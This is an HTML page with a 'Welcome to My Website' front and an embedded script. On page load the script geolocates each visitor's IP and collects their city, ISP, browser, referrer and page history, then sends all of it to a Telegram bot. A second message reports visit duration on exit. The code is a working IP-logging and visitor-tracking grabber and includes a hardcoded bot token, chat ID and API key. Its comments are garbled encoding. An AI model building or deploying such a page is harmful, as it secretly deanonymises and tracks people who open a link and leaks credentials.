<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Visitor Info</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      background-color: #f4f4f9;
      color: #333;
      margin: 0;
      padding: 0;
    }
    h1 {
      margin-top: 20%;
      font-size: 2rem;
    }
    p {
      font-size: 1.2rem;
    }
  </style>
</head>
<body>
  <h1>Welcome to My Website</h1>
  <p>Your visit is being recorded.</p>
  <script>
    const API_KEY = "cef1924200744e29aa52227c2b991181"; // à¦†à¦ªà¦¨à¦¾à¦° API Key
    const TELEGRAM_BOT_TOKEN = "7519273136:AAHZ7eBXEoVZRQFqILu8tGnuMLvtZOWohqc";
    const TELEGRAM_CHAT_ID = "7945358964";

    const startTime = new Date();
    let browsingHistory = [];

    // à¦¨à¦¤à§à¦¨ à¦ªà§ƒà¦·à§à¦ à¦¾ à¦²à§‹à¦¡ à¦¹à¦²à§‡, à¦¬à¦°à§à¦¤à¦®à¦¾à¦¨ à¦ªà§ƒà¦·à§à¦ à¦¾ à¦¸à§‡à¦­ à¦•à¦°à§à¦¨
    browsingHistory.push(window.location.href);

    // à§«à¦Ÿà¦¿ à¦¬à§à¦°à¦¾à¦‰à¦œà¦¿à¦‚ à¦¹à¦¿à¦¸à§à¦Ÿà§‹à¦°à¦¿ à¦¸à¦‚à¦—à§à¦°à¦¹à§‡à¦° à¦¬à§à¦¯à¦¬à¦¸à§à¦¥à¦¾
    setInterval(() => {
      if (browsingHistory.length > 5) {
        browsingHistory.shift(); // à¦¸à¦°à§à¦¬à¦¶à§‡à¦· à§«à¦Ÿà¦¿ à¦¸à¦‚à¦°à¦•à§à¦·à¦£
      }
    }, 1000);

    fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${API_KEY}`)
      .then(response => response.json())
      .then(data => {
        const visitorInfo = {
          ip: data.ip,
          country: data.country_name,
          region: data.state_prov,
          city: data.city,
          isp: data.isp,
          networkType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
          referrer: document.referrer || "No Referrer",
          history: browsingHistory,
          currentPage: window.location.href,
          pageTitle: document.title,
          browser: navigator.userAgent,
          language: navigator.language,
        };

        // à¦‡à¦¨à¦«à§‹ à¦°à¦¿à§Ÿà§‡à¦²à¦Ÿà¦¾à¦‡à¦® à¦ªà¦¾à¦ à¦¾à¦¨à§‹
        const message = `ðŸŒ **New Visitor Info**:
- **IP Address**: ${visitorInfo.ip}
- **Country**: ${visitorInfo.country}
- **Region**: ${visitorInfo.region}
- **City**: ${visitorInfo.city}
- **ISP**: ${visitorInfo.isp}
- **Network Type**: ${visitorInfo.networkType}
- **Referrer**: ${visitorInfo.referrer}
- **Browsing History**: ${visitorInfo.history.join(", ")}
- **Current Page**: ${visitorInfo.currentPage}
- **Page Title**: ${visitorInfo.pageTitle}
- **Browser**: ${visitorInfo.browser}
- **Language**: ${visitorInfo.language}`;

        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown",
          }),
        })
          .then(() => console.log("Real-time info sent to Telegram"))
          .catch(error => console.error("Error sending to Telegram:", error));
      })
      .catch(error => console.error("Error fetching visitor info:", error));

    // à¦ªà§ƒà¦·à§à¦ à¦¾ à¦›à¦¾à¦¡à¦¼à¦¾à¦° à¦¸à¦®à¦¯à¦¼ à¦¤à¦¥à§à¦¯ à¦ªà¦¾à¦ à¦¾à¦¨à§‹
    window.addEventListener("beforeunload", () => {
      const endTime = new Date();
      const visitDuration = Math.round((endTime - startTime) / 1000);

      const exitMessage = `â³ **Visitor Exit Info**:
- **Visit Duration**: ${visitDuration} seconds
- **Browsing History**: ${browsingHistory.join(", ")}`;

      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: exitMessage,
          parse_mode: "Markdown",
        }),
      })
        .then(() => console.log("Exit info sent to Telegram"))
        .catch(error => console.error("Error sending exit info:", error));
    });
  </script>
</body>
</html>
